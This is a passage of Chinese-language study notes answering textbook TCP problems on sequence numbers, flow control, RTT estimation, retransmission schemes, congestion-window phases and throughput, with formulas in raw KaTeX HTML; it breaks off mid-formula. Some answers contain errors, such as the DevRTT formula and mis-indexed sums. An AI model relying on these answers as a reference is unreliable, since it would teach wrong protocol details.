<li>a. 第一个报文段是由主机A发送，序号为127，含80字节数据，因此第二个报文段的序号为207。源端口号302，目的端口号80。<br />
b. 第一个报文段的确认中确认号为207，源端口号80，目的端口号302。<br />
c. 如果第二个报文段首先到达，则确认号为127。因为第二个报文段的序号不对。<br />
d. 如果第一个确认丢失，丢失的确认报文段中确认号为207。第二个确认（确认号为247）在第一个超时间间隔之后到达，在此之前发送方重传第一个报文段，然后收到了确认号为247的第二个确认报文段，于是不再重传，接收方收到重传的第一个报文段之后再一次返回确认号为247的确认报文段。</li>
<li>本题中主机B读出数据的速率小于发送方发送的速率，因此主机B在发回来的确认报文段中会填入剩余缓存数量，表示剩余能够接受的窗口大小，当返回的窗口大小为0时，A将逐渐减缓发送数据，直到窗口为0时暂停发送。最终的传输速率不会超过50Mbps。</li>
<li>略</li>
<li>a. 当数据输入到套接字的速度过快时，容易导致丢包，进而产生很多重复的数据包占用带宽资源，降低总吞吐量。如果路由器缓存容量增加，则会增加缓存中报文的等待时延，当等待时延过大使得发送方超时是又会进行重传，进一步增加了链路中重复报文的数量，可能会导致吞吐量进一步减少。<br />
b. 有助于，因为这样将不会有多余的重复报文占用带宽和缓存。</li>
<li>公式回顾：$$\operatorname{EstimatedRTT}=\operatorname{EstimatedRTT}×(1-\alpha)+\operatorname{SampleRTT}\times\alpha\<br />
\operatorname{DevRTT}=\operatorname{DevRTT}\times(1-\beta)+|\operatorname{DevRTT}-\operatorname{EstimatedRTT}|\times\beta\<br />
\operatorname{TimeoutInterval}=\operatorname{EstimatedRTT}+4\times\operatorname{DevRTT}$$<br />
记忆技巧：EstimatedRTT相当于通过前几个RTT加权计算出来的RTT预估值，DevRTT相当于RTT的波动情况，TimeoutInterval相当于此链路中大多数情况下不会超过的RTT值。计算略。</li>
<li>a. <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo><mi mathvariant="normal">EstimatedRTT</mi><mo>⁡</mo></mo><mi>i</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mo><mi mathvariant="normal">SampleRTT</mi><mo>⁡</mo></mo><mi>i</mi></msub><mo>×</mo><mn>0.</mn><msup><mn>9</mn><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>+</mo><mn>0.1</mn><mo>×</mo><msub><mo><mi mathvariant="normal">SampleRTT</mi><mo>⁡</mo></mo><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\operatorname{EstimatedRTT}_i=\sum_{j=0}^{i-1}\operatorname{SampleRTT}_i\times0.9^{i+1}+0.1\times\operatorname{SampleRTT}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">E</span><span class="mord mathrm">s</span><span class="mord mathrm">t</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span><span class="mord mathrm">a</span><span class="mord mathrm">t</span><span class="mord mathrm">e</span><span class="mord mathrm">d</span><span class="mord mathrm">R</span><span class="mord mathrm">T</span><span class="mord mathrm">T</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.400382em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.964564em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">S</span><span class="mord mathrm">a</span><span class="mord mathrm">m</span><span class="mord mathrm">p</span><span class="mord mathrm">l</span><span class="mord mathrm">e</span><span class="mord mathrm">R</span><span class="mord mathrm">T</span><span class="mord mathrm">T</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.21752399999999997em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">×</span><span class="mord">0</span><span class="mord">.</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">S</span><span class="mord mathrm">a</span><span class="mord mathrm">m</span><span class="mord mathrm">p</span><span class="mord mathrm">l</span><span class="mord mathrm">e</span><span class="mord mathrm">R</span><span class="mord mathrm">T</span><span class="mord mathrm">T</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.21752399999999997em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span></span></span></span><br />
b. 略<br />
c. 当n趋于无穷时，可以发现越近的RTT对EstimatedRTT的影响最大。</li>
<li>如果ACK超时，那么重传之后收到的ACK可能不是对应于重传的分组而是一开始发送的分组，这样计算得到的RTT就小于正确的RTT。</li>
<li>LastByteRcvd≤SendBase-1。SendBase是最早未被确认的字节序号，LastByteRcvd是被接收方接收的最大字节序号。如果链路中没有正在传输的分组，则是等于号，否则为小于号。</li>
<li>y≤LastByteRcvd。假设TCP接收方丢弃失序的报文段的场合：在生成ACK的时间，y等于LastByteRcvd，当ACK报文传回发送方的时候，可能有新的报文到达接收方。</li>
<li>这样会导致重传更加频繁，如两个数据包反序就会导致重传，容易占用大量带宽。</li>
<li>主机A向主机B发送5个报文段且第2个丢失。<br />
a. 对于GBN，A发送的第一批5个报文段收到4个，发送了4个编号为1的ACK。然后A发送4个报文段，收到4个ACK。一共有8个ACK。对于SR，A发送的第一批5个收到4个，发送了4个不同编号的ACK，然后A发送1个报文段即可，收到1个ACK，一共有5个ACK。TCP协议在发送方接收到3个重传ACK之后就即刻重发，只重发了1个报文段，一共有5个ACK。（<font color=red>注意TCP有缓存机制</font>）<br />
b. TCP，因为TCP在检测到3个重复ACK之后就立即重传。</li>
<li>当出现丢包事件时，发送方发送的速率，每个RTT是必须大约等于cwnd报文段。首先发送方发送的速率不能大于cwnd，这是固定的限制条件。发送速率总是大约为cwnd/RTT。</li>
<li>对于图3-46b，即在有限缓存情况下，发送方仅当在确定了一个分组丢失之后才重传，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>λ</mi><mrow><mi>i</mi><mi>n</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">\lambda_{in}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.010556em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span></span></span></span>增加超过了R/2，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>λ</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">\lambda_{out}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>不能增加超过R/3。如果发送速率超过了R/2，则多余的分组一定会丢失，因此增加了链路中重传的报文数量，故接收速率不仅不能增加，还可能会下降。对于图3-46c，即发送方也许会提前发生超时并重传在队列中已经被推迟但还未丢失的分组。这种情况下初始数据分组和重传分组都可能到达接收方，此时可用的吞吐量更加有限。如果一个分组平均重传次数是固定的，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>λ</mi><mrow><mi>i</mi><mi>n</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">\lambda_{in}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.010556em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span></span></span></span>增加可能会导致<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>λ</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">\lambda_{out}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>增加，但实际情况下发送速率增加必然会增加重传次数，因此最终<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>λ</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">\lambda_{out}&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.998892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>不会增加。</li>
<li>a. TCP慢启动运行时的时间间隔为1~6、23~26。<br />
b. TCP拥塞避免运行时的时间间隔为6~16、17~22。<br />
c. 在第16个传输轮回之后，拥塞窗口长度cwnd没有变为1，因此是由于发现了3个冗余ACK而导致的。<br />
d. 是根据检测出超时而导致的。<br />
e. ssthresh的值设置为32。<br />
f. 在第18个传输轮回里，ssthresh的值设置为上一个传输轮回的cwnd的一半，即为21。<br />
g. 在第24个传输轮回中，ssthresh的值被设置为上一个传输轮回的cwnd的一半，即14。<br />
h. 第70个报文段是在第7个传输轮回中被发送。<br />
i. 拥塞的窗口长度为ssthresh+3（因为收到了3个冗余ACK，这是快速恢复的内容，不考），ssthresh的值为4，即变为拥塞长度的一半。cwnd=7。<br />
j. 如果使用TCP tahoe，则在第16个轮回后cwnd会变为1。在第19个传输轮回，ssthresh的值为21，拥塞窗口的长度为4。<br />
k. 从第17个传输轮回到第22个，分别传输了：1、2、4、8、16、21个分组，一共52个。</li>
<li>TCP的AIMD算法的收敛特性。假设TCP不采用乘性减，而是采用按某一个常量减少窗口。所得的AIAD算法将不能收敛于一个平等共享算法。如果是按照某一个常量减少窗口，则不能够收敛到45°线。假设某个时刻两个连接的传输速率为(r<sub>1</sub>, r<sub>2</sub>)，在没有丢包的情况下，这个点将沿着东北方向（45°）线移动，直到穿过135°的带宽阈值线。如果此时两个连接在一个传输轮回都发生了丢包，那么这个点将沿着225°线沿着西南方向后退，没有向中线移动。如果只有其中一个传输轮回发生了丢包，那么这个点或者向正西移动，或者向正南移动。即使这个点距离传输轮回更近，也没有收敛的意思。考虑到在传输速率过大时，传输速率较大的连接更容易发生丢包，因此这里这个点向中线移动的概率更大，但不能收敛到中线。</li>
<li>如果发生了超时，不减少窗口大小，那么发送方会发送很多的重复数据包，而发生超时时链路可能已经非常拥塞，因此这会恶化情况。因此减少窗口大小可以在一定程度上缓解链路的拥塞情况。</li>
<li>本题出现的情况是，链路的传输速率小于应用程序向套接字输入数据的速度，当发送缓存满时，就无法向套接字输入数据了。考虑到链路中不会有任何分组丢失和计时器超时，因此此问题无法通过拥塞控制来解决。实际上当发送缓存满时，进程传输数据的速率自动就降下来了，因为此时发送缓存将这个进程的任务进行了阻塞。</li>
<li>a. 6RTT<br />
b. 平均吞吐量为(6+7+8+9+10+11)/6=8.5MSS。</li>
<li>a. 连接速率从W/2RTT变化到W/RTT，在该周期的结束只丢失了一个分组。这个过程中一共传输了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mfrac><mrow><mn>3</mn><mi>W</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">(</mo><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mrow><mn>3</mn><msup><mi>W</mi><mn>2</mn></msup></mrow><mn>8</mn></mfrac><mo>+</mo><mfrac><mrow><mn>3</mn><mi>W</mi></mrow><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{\frac{3W}{2}(\frac{W}{2}+1)}{2}=\frac{3W^2}{8}+\frac{3W}{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.506265em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.161265em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5508em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8720928571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8720928571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.36292em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01792em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，丢包率=这个值的倒数。<br />
b. 一条连接的丢包率为L，要证明平均速率的值，即证一个RTT之内平均传输了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1.22</mn><msqrt><mi>L</mi></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\frac{1.22}{\sqrt{L}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.383108em;vertical-align:-0.538em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.537397em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322900000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mathnormal mtight">L</span></span></span><span style="top:-2.89229em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.10770999999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">.</span><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.538em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个数据包。考虑a中出现的理想情况，当W足够大时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>≈</mo><mfrac><mn>8</mn><mrow><mn>3</mn><msup><mi>W</mi><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">L\approx\frac{8}{3W^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，注意W的单位是分组数。可以求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>=</mo><msqrt><mfrac><mn>8</mn><mrow><mn>3</mn><mi>L</mi></mrow></mfrac></msqrt></mrow><annotation encoding="application/x-tex">W=\sqrt{\frac{8}{3L}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.604946em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.235054em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight">L</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span 